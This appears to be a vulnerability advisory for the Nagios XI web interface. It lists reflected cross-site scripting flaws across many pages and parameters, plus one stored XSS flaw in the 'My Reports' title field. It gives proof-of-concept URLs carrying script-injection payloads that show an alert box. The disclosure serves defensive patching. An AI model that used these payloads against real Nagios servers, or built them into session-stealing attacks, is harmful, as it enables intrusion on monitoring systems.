Reflected XSS
-----

Page:		/nagiosxi/login.php
Variables:	-
PoCs:		http://site/nagiosxi/login.php/&quot;;alert(&#039;0a29&#039;);&quot;
Details:	The URL is copied into JavaScript variable &#039;backend_url&#039; in an unsafe
		manner
		Also affects:
		/nagiosxi/about/index.php
		/nagiosxi/about/index.php
		/nagiosxi/about/main.php
		/nagiosxi/account/main.php
		/nagiosxi/account/notifymethods.php
		/nagiosxi/account/notifymsgs.php
		/nagiosxi/account/notifyprefs.php
		/nagiosxi/account/testnotification.php
		/nagiosxi/help/index.php
		/nagiosxi/help/main.php
		/nagiosxi/includes/components/alertstream/go.php
		/nagiosxi/includes/components/alertstream/index.php
		/nagiosxi/includes/components/hypermap_replay/index.php
		/nagiosxi/includes/components/massacknowledge/mass_ack.php
		/nagiosxi/includes/components/xicore/recurringdowntime.php/
		/nagiosxi/includes/components/xicore/status.php
		/nagiosxi/includes/components/xicore/tac.php
		/nagiosxi/reports/alertheatmap.php
		/nagiosxi/reports/availability.php
		/nagiosxi/reports/eventlog.php
		/nagiosxi/reports/histogram.php
		/nagiosxi/reports/index.php
		/nagiosxi/reports/myreports.php
		/nagiosxi/reports/nagioscorereports.php
		/nagiosxi/reports/notifications.php
		/nagiosxi/reports/statehistory.php
		/nagiosxi/reports/topalertproducers.php
		/nagiosxi/views/index.php
		/nagiosxi/views/main.php

Page:		/nagiosxi/account/
Variables:	xiwindow
PoCs:		http://site/nagiosxi/account/?xiwindow=&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(&#039;0a29&#039;)&lt;/script&gt;

Page:		/nagiosxi/includes/components/massacknowledge/mass_ack.php
Variables:	-
PoCs:		http://site/nagiosxi/includes/components/massacknowledge/mass_ack.php/&#039;&gt;&lt;script&gt;alert(&quot;0a29&quot;)&lt;/script&gt;

Page:		/nagiosxi/includes/components/xicore/status.php
Variables:	hostgroup, style
PoCs:		http://site/nagiosxi/includes/components/xicore/status.php?show=hostgroups&amp;hostgroup=&#039;&gt;&lt;script&gt;alert(&quot;0a29&quot;)&lt;/script&gt;
		http://site/nagiosxi/includes/components/xicore/status.php?show=hostgroups&amp;hostgroup=all&amp;style=&gt;&lt;script&gt;alert(&quot;0a29&quot;)&lt;/script&gt;

Page:		/nagiosxi/includes/components/xicore/recurringdowntime.php
Variables:	-
PoCs:		http://site/nagiosxi/includes/components/xicore/recurringdowntime.php/&#039;;}}alert(&#039;0a29&#039;)&lt;/script&gt;


Page:		/nagiosxi/reports/alertheatmap.php
Variables:	height, host, service, width
PoCs:		http://site/nagiosxi/reports/alertheatmap.php?height=&quot;&gt;&lt;script&gt;alert(&quot;0a29&quot;)&lt;/script&gt;
		http://site/nagiosxi/reports/alertheatmap.php?host=&quot;&gt;&lt;script&gt;alert(&quot;0a29&quot;)&lt;/script&gt;
		http://site/nagiosxi/reports/alertheatmap.php?service=&quot;&gt;&lt;script&gt;alert(&quot;0a29&quot;)&lt;/script&gt;
		http://site/nagiosxi/reports/alertheatmap.php?width=&quot;&gt;&lt;script&gt;alert(&quot;0a29&quot;)&lt;/script&gt;

Page:		/nagiosxi/reports/histogram.php
Variable:	service
PoCs:		http://site/nagiosxi/reports/histogram.php?service=&quot;&gt;&lt;script&gt;alert(&quot;0a29&quot;)&lt;/script&gt;

Page:		/nagiosxi/reports/notifications.php
Variables:	host, service
PoCs:		http://site/nagiosxi/reports/notifications.php?host=&quot;&gt;&lt;script&gt;alert(&quot;0a29&quot;)&lt;/script&gt;
		http://site/nagiosxi/reports/notifications.php?service=&quot;&gt;&lt;script&gt;alert(&quot;0a29&quot;)&lt;/script&gt;

Page:		/nagiosxi/reports/statehistory.php
Variables:	host, service
PoCs:		http://site/nagiosxi/reports/statehistory.php?host=&quot;&gt;&lt;script&gt;alert(&quot;0a29&quot;)&lt;/script&gt;
		http://site/nagiosxi/reports/statehistory.php?service=&quot;&gt;&lt;script&gt;alert(&quot;0a29&quot;)&lt;/script&gt;


Stored XSS
-----

Page:		/nagiosxi/reports/myreports.php
Variable:	title
Details:	It is possible to store XSS within &#039;My Reports&#039;, however it
is believed this
		is only viewable by the logged-in user.
		1) View a report and save it, e.g.
		http://site/nagiosxi/reports/myreports.php?add=1&amp;title=Availability+Summary&amp;url=%2Fnagiosxi%2Freports%2Favailability.php&amp;meta_s=a%3A0%3A%7B%7D
		2) Name the report with XSS, e.g. &quot;&gt;&lt;script&gt;alert(&quot;0a29&quot;)&lt;/script&gt;

